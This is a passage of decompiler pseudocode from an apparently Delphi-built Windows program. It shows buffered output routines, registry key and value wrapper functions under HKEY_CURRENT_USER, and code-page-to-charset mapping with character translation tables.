    case 1i64:
      sub_40DFA8((int)&savedregs);
      break;
    case 2i64:
      sub_40DFD0((_DWORD *)1, (int)&savedregs);
      break;
    case 3i64:
      sub_40DFD0((_DWORD *)2, (int)&savedregs);
      break;
    case 4i64:
    case 0xFi64:
      sub_40DFD0((_DWORD *)4, (int)&savedregs);
      break;
    case 5i64:
      sub_40DFD0((_DWORD *)0xA, (int)&savedregs);
      break;
    case 6i64:
    case 7i64:
      sub_40DEB0(v7, &v6, v2);
      break;
    case 0xAi64:
    case 0xCi64:
    case 0x12i64:
      sub_40E024((int)&savedregs);
      break;
    case 0xBi64:
      sub_40DF60(v7, v2);
      break;
    case 0xEi64:
      sub_40E04C((int)&savedregs);
      break;
    case 0x10i64:
    case 0x11i64:
    case 0x13i64:
      sub_40DFD0((_DWORD *)8, (int)&savedregs);
      break;
    default:
      break;
  }
  __writefsdword(0, v4[0]);
  v5 = (int *)&loc_40E210;
  return sub_4034C8(&v6);
}
// 40E188: variable 'v2' is possibly undefined

//----- (0040E214) --------------------------------------------------------
_DWORD *__usercall sub_40E214@<eax>(_DWORD *a1@<eax>, int a2@<ecx>)
{
  int v3; // ecx
  unsigned int v5[2]; // [esp-10h] [ebp-14h] BYREF
  int *v6; // [esp-8h] [ebp-Ch]
  char *v7; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v7 = 0;
  v6 = &savedregs;
  v5[1] = (unsigned int)&loc_40E251;
  v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
  sub_40DEB0(a1, &v7, a2);
  sub_40E0AC(a1, v3);
  __writefsdword(0, v5[0]);
  v6 = (int *)&loc_40E258;
  return sub_4034C8(&v7);
}
// 40E236: variable 'v3' is possibly undefined

//----- (0040E25C) --------------------------------------------------------
int *__usercall sub_40E25C@<eax>(int *result@<eax>, char *a2@<edx>, unsigned int a3@<ecx>)
{
  int *v5; // edi
  unsigned int v6; // ecx
  bool v7; // cc
  unsigned int v8; // ecx
  char v9; // dl
  unsigned int v10; // ecx
  int *v11; // edi
  char *v12; // esi
  int v13; // ecx
  int *v14; // [esp-4h] [ebp-10h]

  v5 = result;
  while ( a3 )
  {
    v6 = v5[3];
    v7 = v6 <= v5[4];
    v8 = v6 - v5[4];
    if ( v7 )
    {
      sub_40E2A8(v5);
      v8 = v5[3];
    }
    if ( v8 >= a3 )
      v8 = a3;
    a3 -= v8;
    v14 = v5;
    result = (int *)(v5[4] + v5[2]);
    v5[4] += v8;
    v9 = v8;
    v10 = v8 >> 2;
    qmemcpy(result, a2, 4 * v10);
    v12 = &a2[4 * v10];
    v11 = &result[v10];
    v13 = v9 & 3;
    qmemcpy(v11, v12, v13);
    a2 = &v12[v13];
    v5 = v14;
  }
  return result;
}

//----- (0040E2A8) --------------------------------------------------------
int __usercall sub_40E2A8@<eax>(int *a1@<eax>)
{
  int result; // eax

  sub_40D8BC(a1[1], a1[2], a1[4]);
  result = 0;
  a1[4] = 0;
  return result;
}

//----- (0040E2C0) --------------------------------------------------------
int *__usercall sub_40E2C0@<eax>(int *a1@<eax>, int a2@<ecx>)
{
  return sub_40E32C(a1, 1, a2);
}

//----- (0040E2C8) --------------------------------------------------------
int *__usercall sub_40E2C8@<eax>(int *a1@<eax>, int a2@<ecx>)
{
  return sub_40E32C(a1, 0, a2);
}

//----- (0040E2D0) --------------------------------------------------------
int *__usercall sub_40E2D0@<eax>(int *a1@<eax>, char *a2@<edx>)
{
  int v4; // ecx
  unsigned int v6[3]; // [esp+0h] [ebp-Ch] BYREF

  v6[0] = sub_403724((int)a2);
  if ( (int)v6[0] > 255 )
  {
    sub_40E32C(a1, 12, v4);
    sub_40E25C(a1, (char *)v6, 4u);
  }
  else
  {
    sub_40E32C(a1, 6, v4);
    sub_40E25C(a1, (char *)v6, 1u);
  }
  return sub_40E25C(a1, a2, v6[0]);
}
// 40E2EE: variable 'v4' is possibly undefined

//----- (0040E32C) --------------------------------------------------------
int *__usercall sub_40E32C@<eax>(int *a1@<eax>, char a2@<dl>, int a3@<ecx>)
{
  int v4; // [esp+0h] [ebp-4h] BYREF

  v4 = a3;
  LOBYTE(v4) = a2;
  return sub_40E25C(a1, (char *)&v4, 1u);
}

//----- (0040E340) --------------------------------------------------------
int sub_40E340()
{
  int result; // eax

  if ( hWnd )
  {
    DestroyWindow(hWnd);
    result = 0;
    hWnd = 0;
  }
  return result;
}

//----- (0040E35C) --------------------------------------------------------
_DWORD *sub_40E35C()
{
  int v0; // edi
  int v1; // ebx
  int v2; // esi
  _DWORD *v3; // eax
  unsigned int v5[2]; // [esp-Ch] [ebp-18h] BYREF
  int *v6; // [esp-4h] [ebp-10h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v0 = sub_40C4B0(dword_41E620);
  v6 = &savedregs;
  v5[1] = (unsigned int)&loc_40E3B1;
  v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
  if ( *(_DWORD *)(v0 + 8) - 1 >= 0 )
  {
    v1 = *(_DWORD *)(v0 + 8);
    v2 = 0;
    do
    {
      v3 = (_DWORD *)sub_40C20C(v0, v2);
      sub_402BDC(v3);
      ++v2;
      --v1;
    }
    while ( v1 );
  }
  __writefsdword(0, v5[0]);
  v6 = (int *)&loc_40E3B8;
  sub_40C514(dword_41E620);
  return sub_402BDC((_DWORD *)dword_41E620);
}
// 41E620: using guessed type int dword_41E620;

//----- (0040E3C8) --------------------------------------------------------
// attributes: thunk
void __usercall sub_40E3C8(void *a1@<eax>)
{
  sub_40BEA8(a1);
}

//----- (0040E3D0) --------------------------------------------------------
int sub_40E3D0()
{
  _DWORD **v0; // eax
  int result; // eax
  unsigned int v2[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v2[2] = (unsigned int)&savedregs;
  v2[1] = (unsigned int)&loc_40E47C;
  v2[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v2);
  if ( !++dword_41E614 )
  {
    sub_40BEA8(hInst);
    sub_40A5A0(dword_41E610);
    sub_40E35C();
    sub_402BDC((_DWORD *)dword_41E618);
    sub_402BDC((_DWORD *)dword_41E61C);
    sub_40DC7C(0, 0);
    sub_402BDC((_DWORD *)dword_41E624);
    dword_41E624 = 0;
    v0 = (_DWORD **)sub_4059F0();
    sub_402BDC(v0[2]);
    sub_40E340();
    sub_402BDC((_DWORD *)dword_41E610);
    dword_41E610 = 0;
    sub_404A1C((int)sub_40E3C8);
    DeleteCriticalSection_0(&stru_41E628);
  }
  result = 0;
  __writefsdword(0, v2[0]);
  return result;
}
// 41E610: using guessed type int dword_41E610;
// 41E614: using guessed type int dword_41E614;
// 41E618: using guessed type int dword_41E618;
// 41E61C: using guessed type int dword_41E61C;
// 41E624: using guessed type int dword_41E624;

//----- (0040E488) --------------------------------------------------------
void sub_40E488()
{
  if ( dword_41E614-- == 0 )
  {
    InitializeCriticalSection_0(&stru_41E628);
    sub_404A14((int)sub_40E3C8);
    dword_41E610 = (int)sub_40A4BC(dword_406C68, 1);
    dword_41E618 = (int)sub_40C358(dword_40B96C, 1);
    dword_41E61C = (int)sub_402BAC(&off_40BBB4, 1);
    dword_41E620 = (int)sub_40C358(dword_40B96C, 1);
    dword_41E624 = (int)sub_40C358(dword_40B96C, 1);
  }
}
// 406C68: using guessed type int dword_406C68[2];
// 40B96C: using guessed type int dword_40B96C[3];
// 40BBB4: using guessed type void *off_40BBB4;
// 41E610: using guessed type int dword_41E610;
// 41E614: using guessed type int dword_41E614;
// 41E618: using guessed type int dword_41E618;
// 41E61C: using guessed type int dword_41E61C;
// 41E620: using guessed type int dword_41E620;
// 41E624: using guessed type int dword_41E624;

//----- (0040E514) --------------------------------------------------------
int sub_40E514()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_40E550;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  if ( !++dword_41E644 )
    sub_403BE8((int *)&off_41C2F0, (char *)dword_401004, 2);
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 401004: using guessed type int dword_401004[2];
// 41C2F0: using guessed type int (*off_41C2F0)[4];
// 41E644: using guessed type int dword_41E644;

//----- (0040E55C) --------------------------------------------------------
void sub_40E55C()
{
  --dword_41E644;
}
// 41E644: using guessed type int dword_41E644;

//----- (0040E62C) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int __usercall sub_40E62C@<eax>(DWORD a1@<eax>)
{
  int result; // eax
  DWORD v2; // [esp-10h] [ebp-1Ch] BYREF
  DWORD v3; // [esp-Ch] [ebp-18h]
  DWORD v4; // [esp-8h] [ebp-14h]
  const ULONG_PTR *v5; // [esp-4h] [ebp-10h]

  v2 = a1;
  LOBYTE(v3) = 11;
  sub_409548((int)dword_40E5B0, 1, off_41DB70[0], 0, (int)&v2);
  sub_402F98(v2, v3, v4, v5);
  return result;
}
// 40E657: positive sp value 10 has been found
// 40E5B0: using guessed type int dword_40E5B0[5];
// 41DB70: using guessed type int **off_41DB70[32];

//----- (0040E658) --------------------------------------------------------
bool __usercall sub_40E658@<al>(_BYTE *a1@<eax>)
{
  return !a1 || *a1 != 92;
}

//----- (0040E66C) --------------------------------------------------------
int __usercall sub_40E66C@<eax>(char a1@<al>)
{
  char v1; // al
  char v2; // al
  char v3; // al

  v1 = a1 - 1;
  if ( !v1 )
    return 1;
  v2 = v1 - 1;
  if ( !v2 )
    return 2;
  v3 = v2 - 1;
  if ( !v3 )
    return 4;
  if ( v3 == 1 )
    return 3;
  return 0;
}

//----- (0040E69C) --------------------------------------------------------
char __usercall sub_40E69C@<al>(int a1@<eax>)
{
  switch ( a1 )
  {
    case 1:
      return 1;
    case 2:
      return 2;
    case 4:
      return 3;
    case 3:
      return 4;
  }
  return 0;
}

//----- (0040E6C4) --------------------------------------------------------
int __usercall sub_40E6C4@<eax>(int a1@<eax>, char a2@<dl>)
{
  char v2; // bl
  int v3; // esi

  if ( a2 )
    a1 = sub_402CDC(a1, a2);
  v2 = a2;
  v3 = a1;
  sub_40E764(a1, HKEY_CURRENT_USER);
  *(_DWORD *)(v3 + 24) = 983103;
  *(_BYTE *)(v3 + 12) = 1;
  if ( v2 )
    sub_402D34((_DWORD *)v3);
  return v3;
}
// 40E6D2: variable 'a2' is possibly undefined

//----- (0040E708) --------------------------------------------------------
_DWORD *__usercall sub_40E708@<eax>(_DWORD *a1@<eax>, char a2@<dl>)
{
  _DWORD *v2; // eax
  char v3; // dl
  char v4; // bl
  _DWORD *v5; // esi
  _DWORD *result; // eax

  v2 = sub_402D3C(a1, a2);
  v4 = v3;
  v5 = v2;
  sub_40E734((int)v2);
  result = sub_402BCC(v5, v4 & 0xFC);
  if ( v4 > 0 )
    return (_DWORD *)sub_402D2C(v5);
  return result;
}
// 40E70F: variable 'v3' is possibly undefined

//----- (0040E734) --------------------------------------------------------
HKEY __usercall sub_40E734@<eax>(int a1@<eax>)
{
  HKEY result; // eax

  result = *(HKEY *)(a1 + 4);
  if ( result )
  {
    if ( *(_BYTE *)(a1 + 12) )
      RegCloseKey_0(result);
    else
      RegFlushKey(result);
    *(_DWORD *)(a1 + 4) = 0;
    return (HKEY)sub_4034C8((_DWORD *)(a1 + 16));
  }
  return result;
}

//----- (0040E764) --------------------------------------------------------
HKEY __usercall sub_40E764@<eax>(int a1@<eax>, HKEY a2@<edx>)
{
  HKEY result; // eax

  result = *(HKEY *)(a1 + 8);
  if ( a2 != result )
  {
    if ( *(_BYTE *)(a1 + 20) )
    {
      RegCloseKey_0(result);
      *(_BYTE *)(a1 + 20) = 0;
    }
    *(_DWORD *)(a1 + 8) = a2;
    return sub_40E734(a1);
  }
  return result;
}

//----- (0040E790) --------------------------------------------------------
volatile __int32 *__usercall sub_40E790@<eax>(int a1@<eax>, int a2@<edx>, __int32 a3@<ecx>)
{
  sub_40E734(a1);
  *(_DWORD *)(a1 + 4) = a2;
  return sub_40351C((volatile __int32 *)(a1 + 16), a3);
}

//----- (0040E7B4) --------------------------------------------------------
int __usercall sub_40E7B4@<eax>(int a1@<eax>, char a2@<dl>)
{
  if ( *(_DWORD *)(a1 + 4) && a2 )
    return *(_DWORD *)(a1 + 4);
  else
    return *(_DWORD *)(a1 + 8);
}

//----- (0040E7C8) --------------------------------------------------------
bool __usercall sub_40E7C8@<al>(int a1@<eax>, __int32 a2@<edx>, char a3@<cl>)
{
  bool v4; // bl
  HKEY v5; // eax
  HKEY v6; // eax
  char *v8; // [esp-2Ch] [ebp-44h]
  char *v9; // [esp-1Ch] [ebp-34h]
  REGSAM v10; // [esp-1Ch] [ebp-34h]
  REGSAM v11; // [esp-14h] [ebp-2Ch]
  unsigned int v12[2]; // [esp-Ch] [ebp-24h] BYREF
  int *v13; // [esp-4h] [ebp-1Ch]
  DWORD dwDisposition; // [esp+8h] [ebp-10h] BYREF
  char *v15; // [esp+Ch] [ebp-Ch] BYREF
  HKEY phkResult; // [esp+10h] [ebp-8h] BYREF
  bool v17; // [esp+16h] [ebp-2h]
  char v18; // [esp+17h] [ebp-1h]
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v15 = 0;
  v18 = a3;
  v13 = &savedregs;
  v12[1] = (unsigned int)&loc_40E8CD;
  v12[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v12);
  sub_403560((volatile __int32 *)&v15, a2);
  v4 = sub_40E658(v15);
  if ( !v4 )
    sub_40396C(&v15, 1, 1);
  phkResult = 0;
  if ( v18 && v15 )
  {
    v10 = *(_DWORD *)(a1 + 24);
    v8 = sub_4038E8(v15);
    v6 = (HKEY)sub_40E7B4(a1, v4);
    v17 = RegCreateKeyExA(v6, v8, 0, 0, 0, v10, 0, &phkResult, &dwDisposition) == 0;
  }
  else
  {
    v11 = *(_DWORD *)(a1 + 24);
    v9 = sub_4038E8(v15);
    v5 = (HKEY)sub_40E7B4(a1, v4);
    v17 = RegOpenKeyExA_0(v5, v9, 0, v11, &phkResult) == 0;
  }
  if ( v17 )
  {
    if ( v4 && *(_DWORD *)(a1 + 4) != 0 )
      sub_4037E4((volatile __int32 *)&v15, 3);
    sub_40E790(a1, (int)phkResult, (__int32)v15);
  }
  __writefsdword(0, v12[0]);
  v13 = (int *)&loc_40E8D4;
  sub_4034C8(&v15);
  return v17;
}

//----- (0040E8EC) --------------------------------------------------------
int __usercall sub_40E8EC@<eax>(int a1@<eax>, char *a2@<edx>, DWORD a3@<ecx>, int a4@<ebx>)
{
  char *v7; // eax
  int Type[5]; // [esp+0h] [ebp-14h] BYREF

  Type[0] = a3;
  sub_4028D4((char *)a3, 8, 0);
  v7 = sub_4038E8(a2);
  LOBYTE(a4) = RegQueryValueExA_0(*(HKEY *)(a1 + 4), v7, 0, (LPDWORD)Type, 0, (LPDWORD)(a3 + 4)) == 0;
  *(_BYTE *)a3 = sub_40E69C(Type[0]);
  return a4;
}
// 40E8EC: using guessed type DWORD Type[5];

//----- (0040E93C) --------------------------------------------------------
int __usercall sub_40E93C@<eax>(int a1@<eax>, char *a2@<edx>)
{
  _DWORD v3[4]; // [esp+0h] [ebp-10h] BYREF

  if ( (unsigned __int8)sub_40E8EC(a1, a2, (DWORD)v3, a1) )
    return v3[1];
  else
    return -1;
}

//----- (0040E964) --------------------------------------------------------
void __usercall sub_40E964(int a1@<eax>, char *a2@<edx>, char *a3@<ecx>)
{
  char *v6; // eax
  DWORD v7; // [esp-4h] [ebp-10h]

  v7 = sub_403724((int)a3) + 1;
  v6 = sub_4038E8(a3);
  sub_40EA08(a1, a2, (BYTE *)v6, 1, v7);
}

//----- (0040E990) --------------------------------------------------------
_DWORD *__usercall sub_40E990@<eax>(int a1@<eax>, char *a2@<edx>, char **a3@<ecx>)
{
  int v6; // ebx
  char *v7; // eax
  char *v8; // eax
  int v9; // eax
  int v11[5]; // [esp+0h] [ebp-14h] BYREF

  v11[0] = (int)a3;
  v6 = sub_40E93C(a1, a2);
  if ( v6 <= 0 )
    return sub_4034C8(a3);
  sub_4035B0(a3, 0, v6);
  v7 = sub_4038E8(*a3);
  sub_40EA70((LPBYTE)v7, a1, a2, (int)v11, v6);
  if ( LOBYTE(v11[0]) != 1 && LOBYTE(v11[0]) != 2 )
    return (_DWORD *)sub_40E62C((DWORD)a2);
  v8 = sub_4038E8(*a3);
  v9 = sub_407534(v8);
  return sub_4039FC(a3, v9);
}
// 40E990: using guessed type int var_14[5];

//----- (0040EA08) --------------------------------------------------------
void __userpurge sub_40EA08(int a1@<eax>, char *a2@<edx>, BYTE *a3@<ecx>, char a4, DWORD cbData)
{
  char *v7; // eax
  int v8; // [esp-Ch] [ebp-24h]
  DWORD v9; // [esp+0h] [ebp-18h]
  DWORD v10; // [esp+4h] [ebp-14h]
  DWORD v11; // [esp+8h] [ebp-10h]
  const ULONG_PTR *v12; // [esp+Ch] [ebp-Ch] BYREF
  char v13; // [esp+10h] [ebp-8h]
  BYTE *lpData; // [esp+14h] [ebp-4h]

  lpData = a3;
  v8 = sub_40E66C(a4);
  v7 = sub_4038E8(a2);
  if ( RegSetValueExA(*(HKEY *)(a1 + 4), v7, 0, v8, lpData, cbData) )
  {
    v12 = (const ULONG_PTR *)a2;
    v13 = 11;
    sub_409548((int)dword_40E5B0, 1, off_41DBB8[0], 0, (int)&v12);
    sub_402F98(v9, v10, v11, v12);
  }
}
// 40EA61: variable 'v9' is possibly undefined
// 40EA61: variable 'v10' is possibly undefined
// 40EA61: variable 'v11' is possibly undefined
// 40E5B0: using guessed type int dword_40E5B0[5];
// 41DBB8: using guessed type int **off_41DBB8[14];

//----- (0040EA70) --------------------------------------------------------
DWORD __userpurge sub_40EA70@<eax>(LPBYTE lpData@<ecx>, int a2@<eax>, char *a3@<edx>, int a4, DWORD cbData)
{
  char *v7; // eax
  DWORD v8; // ebx
  DWORD v11; // [esp+0h] [ebp-18h]
  DWORD v12; // [esp+4h] [ebp-14h]
  DWORD v13; // [esp+8h] [ebp-10h]
  const ULONG_PTR *v14; // [esp+Ch] [ebp-Ch] BYREF
  char v15; // [esp+10h] [ebp-8h]
  DWORD Type; // [esp+14h] [ebp-4h] BYREF

  Type = 0;
  v7 = sub_4038E8(a3);
  if ( RegQueryValueExA_0(*(HKEY *)(a2 + 4), v7, 0, &Type, lpData, &cbData) )
  {
    v14 = (const ULONG_PTR *)a3;
    v15 = 11;
    sub_409548((int)dword_40E5B0, 1, off_41DC90, 0, (int)&v14);
    sub_402F98(v11, v12, v13, v14);
  }
  v8 = cbData;
  *(_BYTE *)a4 = sub_40E69C(Type);
  return v8;
}
// 40EAC3: variable 'v11' is possibly undefined
// 40EAC3: variable 'v12' is possibly undefined
// 40EAC3: variable 'v13' is possibly undefined
// 40E5B0: using guessed type int dword_40E5B0[5];
// 41DC90: using guessed type int **off_41DC90;

//----- (0040EAE4) --------------------------------------------------------
int __usercall sub_40EAE4@<eax>(int a1@<eax>, char *a2@<edx>, int a3@<ebx>)
{
  int v4; // [esp+0h] [ebp-8h] BYREF

  return sub_40E8EC(a1, a2, (DWORD)&v4, a3);
}

//----- (0040EB0C) --------------------------------------------------------
int sub_40EB0C()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_40EB48;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  if ( !++dword_41E648 )
    sub_403BE8((int *)&off_41C2F8, (char *)dword_401004, 2);
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 401004: using guessed type int dword_401004[2];
// 41C2F8: using guessed type int (*off_41C2F8)[4];
// 41E648: using guessed type int dword_41E648;

//----- (0040EB54) --------------------------------------------------------
void sub_40EB54()
{
  --dword_41E648;
}
// 41E648: using guessed type int dword_41E648;

//----- (0040EB64) --------------------------------------------------------
int sub_40EB64()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_40EB89;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  ++dword_41E64C;
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 41E64C: using guessed type int dword_41E64C;

//----- (0040EB94) --------------------------------------------------------
void sub_40EB94()
{
  --dword_41E64C;
}
// 41E64C: using guessed type int dword_41E64C;

//----- (0040EB9C) --------------------------------------------------------
_WORD *__userpurge sub_40EB9C@<eax>(_WORD *result@<eax>, _WORD *a2@<ecx>, int a3)
{
  int v3; // esi
  _WORD *v4; // edx

  v3 = 128;
  v4 = result;
  do
  {
    *a2++ = *v4++;
    --v3;
  }
  while ( v3 );
  return result;
}

//----- (0040EBC4) --------------------------------------------------------
_WORD *__usercall sub_40EBC4@<eax>(char a1@<al>, _WORD *a2@<edx>, int a3@<ecx>)
{
  _WORD *result; // eax

  result = (_WORD *)(a1 & 0x7F);
  switch ( (unsigned int)result )
  {
    case 0u:
      result = sub_40EB9C(word_41C300, a2, a3);
      break;
    case 1u:
      result = sub_40EB9C(word_41C400, a2, a3);
      break;
    case 2u:
      result = sub_40EB9C(word_41C500, a2, a3);
      break;
    case 3u:
      result = sub_40EB9C(word_41C600, a2, a3);
      break;
    case 4u:
      result = sub_40EB9C(word_41C700, a2, a3);
      break;
    case 5u:
      result = sub_40EB9C(word_41C800, a2, a3);
      break;
    case 6u:
      result = sub_40EB9C(word_41C900, a2, a3);
      break;
    case 7u:
      result = sub_40EB9C(word_41CA00, a2, a3);
      break;
    case 8u:
      result = sub_40EB9C(word_41CB00, a2, a3);
      break;
    case 9u:
      result = sub_40EB9C(word_41CC00, a2, a3);
      break;
    case 0xAu:
      result = sub_40EB9C(word_41CD00, a2, a3);
      break;
    case 0xBu:
      result = sub_40EB9C(word_41CE00, a2, a3);
      break;
    case 0xCu:
      result = sub_40EB9C(word_41CF00, a2, a3);
      break;
    case 0xDu:
      result = sub_40EB9C(word_41D000, a2, a3);
      break;
    case 0xEu:
      result = sub_40EB9C(word_41D100, a2, a3);
      break;
    case 0xFu:
      result = sub_40EB9C(word_41D200, a2, a3);
      break;
    case 0x10u:
      result = sub_40EB9C(word_41D300, a2, a3);
      break;
    case 0x11u:
      result = sub_40EB9C(word_41D400, a2, a3);
      break;
    case 0x12u:
      result = sub_40EB9C(word_41D500, a2, a3);
      break;
    case 0x13u:
      result = sub_40EB9C(word_41D600, a2, a3);
      break;
    default:
      return result;
  }
  return result;
}
// 41C300: using guessed type _WORD word_41C300[128];
// 41C400: using guessed type _WORD word_41C400[128];
// 41C500: using guessed type _WORD word_41C500[128];
// 41C600: using guessed type _WORD word_41C600[128];
// 41C700: using guessed type _WORD word_41C700[128];
// 41C800: using guessed type _WORD word_41C800[128];
// 41C900: using guessed type _WORD word_41C900[128];
// 41CA00: using guessed type _WORD word_41CA00[128];
// 41CB00: using guessed type _WORD word_41CB00[128];
// 41CC00: using guessed type _WORD word_41CC00[128];
// 41CD00: using guessed type _WORD word_41CD00[128];
// 41CE00: using guessed type _WORD word_41CE00[128];
// 41CF00: using guessed type _WORD word_41CF00[128];
// 41D000: using guessed type _WORD word_41D000[128];
// 41D100: using guessed type _WORD word_41D100[128];
// 41D200: using guessed type _WORD word_41D200[128];
// 41D300: using guessed type _WORD word_41D300[128];
// 41D400: using guessed type _WORD word_41D400[128];
// 41D500: using guessed type _WORD word_41D500[128];
// 41D600: using guessed type _WORD word_41D600[128];

//----- (0040EDA4) --------------------------------------------------------
_DWORD *__userpurge sub_40EDA4@<eax>(int a1@<eax>, char a2@<dl>, char a3@<cl>, char **a4)
{
  int v5; // eax
  unsigned __int8 v6; // bl
  int v7; // edx
  __int16 *v8; // eax
  unsigned int v10[2]; // [esp-Ch] [ebp-228h] BYREF
  int *v11; // [esp-4h] [ebp-220h]
  char *v12; // [esp+8h] [ebp-214h] BYREF
  __int16 v13[128]; // [esp+Ch] [ebp-210h] BYREF
  __int16 v14[128]; // [esp+10Ch] [ebp-110h] BYREF
  int v15; // [esp+20Ch] [ebp-10h]
  int v16; // [esp+210h] [ebp-Ch]
  char v17; // [esp+217h] [ebp-5h]
  int v18; // [esp+218h] [ebp-4h] BYREF
  int savedregs; // [esp+21Ch] [ebp+0h] BYREF

  v12 = 0;
  v17 = a3;
  v18 = a1;
  sub_4038D8(a1);
  v11 = &savedregs;
  v10[1] = (unsigned int)&loc_40EE9C;
  v10[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v10);
  sub_40EBC4(a2, v14, 127);
  sub_40EBC4(v17, v13, 127);
  sub_4034C8(a4);
  v5 = sub_403724(v18);
  if ( v5 > 0 )
  {
    v15 = v5;
    v16 = 1;
    do
    {
      v6 = *(_BYTE *)(v18 + v16 - 1);
      if ( v6 > 0x80u )
      {
        v7 = 128;
        v8 = v13;
        do
        {
          if ( v13[v6] == *v8 )
            break;
          ++v7;
          ++v8;
        }
        while ( v7 != 256 );
      }
      sub_403670(&v12);
      sub_40372C(a4, (__int32)v12);
      ++v16;
      --v15;
    }
    while ( v15 );
  }
  __writefsdword(0, v10[0]);
  v11 = (int *)&loc_40EEA3;
  sub_4034C8(&v12);
  return sub_4034C8(&v18);
}
// 40EDA4: using guessed type __int16 var_110[128];
// 40EDA4: using guessed type __int16 var_210[128];

//----- (0040EEAC) --------------------------------------------------------
int sub_40EEAC()
{
  UINT ACP; // eax
  int v1; // edx

  ACP = GetACP();
  LOBYTE(v1) = 12;
  if ( ACP == 1250 )
    LOBYTE(v1) = 10;
  if ( ACP == 1251 )
    LOBYTE(v1) = 11;
  if ( ACP == 1253 )
    LOBYTE(v1) = 13;
  if ( ACP == 1254 )
    LOBYTE(v1) = 14;
  if ( ACP == 1255 )
    LOBYTE(v1) = 15;
  if ( ACP == 1256 )
    LOBYTE(v1) = 16;
  if ( ACP == 1257 )
    LOBYTE(v1) = 17;
  if ( ACP == 1258 )
    LOBYTE(v1) = 18;
  return v1;
}
// 40EEFB: variable 'v1' is possibly undefined

//----- (0040EF00) --------------------------------------------------------
volatile __int32 *__usercall sub_40EF00@<eax>(char a1@<al>, volatile __int32 *a2@<edx>)
{
  volatile __int32 *result; // eax

  switch ( a1 & 0x7F )
  {
    case 1:
      result = sub_40351C(a2, (__int32)"ISO-8859-2");
      break;
    case 2:
      result = sub_40351C(a2, (__int32)"ISO-8859-3");
      break;
    case 3:
      result = sub_40351C(a2, (__int32)"ISO-8859-4");
      break;
    case 4:
      result = sub_40351C(a2, (__int32)"ISO-8859-5");
      break;
    case 5:
      result = sub_40351C(a2, (__int32)"ISO-8859-6");
      break;
    case 6:
      result = sub_40351C(a2, (__int32)"ISO-8859-7");
      break;
    case 7:
      result = sub_40351C(a2, (__int32)"ISO-8859-8");
      break;
    case 8:
      result = sub_40351C(a2, (__int32)"ISO-8859-9");
      break;
    case 9:
      result = sub_40351C(a2, (__int32)"ISO-8859-10");
      break;
    case 0xA:
      result = sub_40351C(a2, (__int32)"WINDOWS-1250");
      break;
    case 0xB:
      result = sub_40351C(a2, (__int32)"WINDOWS-1251");
      break;
    case 0xC:
      result = sub_40351C(a2, (__int32)"WINDOWS-1252");
      break;
    case 0xD:
      result = sub_40351C(a2, (__int32)"WINDOWS-1253");
      break;
    case 0xE:
      result = sub_40351C(a2, (__int32)"WINDOWS-1254");
      break;
    case 0xF:
      result = sub_40351C(a2, (__int32)"WINDOWS-1255");
      break;
    case 0x10:
      result = sub_40351C(a2, (__int32)"WINDOWS-1256");
      break;
    case 0x11:
      result = sub_40351C(a2, (__int32)"WINDOWS-1257");
      break;
    case 0x12:
      result = sub_40351C(a2, (__int32)"WINDOWS-1258");
      break;
    case 0x13:
      result = sub_40351C(a2, (__int32)"KOI8-R");
      break;
    default:
      result = sub_40351C(a2, (__int32)"ISO-8859-1");
      break;
  }
  return result;
}

//----- (0040F230) --------------------------------------------------------
char __usercall sub_40F230@<al>(int a1@<eax>, char a2@<dl>, signed __int32 a3@<ecx>)
{
  int v3; // ebx
  int v4; // esi
  int i; // esi
  bool v6; // cf
  int v7; // edi
  int v8; // ebx
  int v9; // eax
  unsigned int v11[2]; // [esp-Ch] [ebp-34h] BYREF
  int *v12; // [esp-4h] [ebp-2Ch]
  char *v13; // [esp+Ch] [ebp-1Ch] BYREF
  char *v14; // [esp+10h] [ebp-18h] BYREF
  char *v15; // [esp+14h] [ebp-14h] BYREF
  int v16; // [esp+18h] [ebp-10h]
  char v17; // [esp+1Eh] [ebp-Ah]
  signed __int32 v18; // [esp+1Fh] [ebp-9h] BYREF
  char v19; // [esp+23h] [ebp-5h]
  int v20; // [esp+24h] [ebp-4h] BYREF
  int savedregs; // [esp+28h] [ebp+0h] BYREF

  v13 = 0;
  v15 = 0;
  v14 = 0;
  v18 = a3;
  v19 = a2;
  v20 = a1;
  sub_4038D8(a1);
  v12 = &savedregs;
  v11[1] = (unsigned int)&loc_40F334;
  v11[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v11);
  v17 = 0;
  sub_4034C8(&v15);
  v3 = sub_403724(v20);
  if ( v3 > 0 )
  {
    v4 = 1;
    do
    {
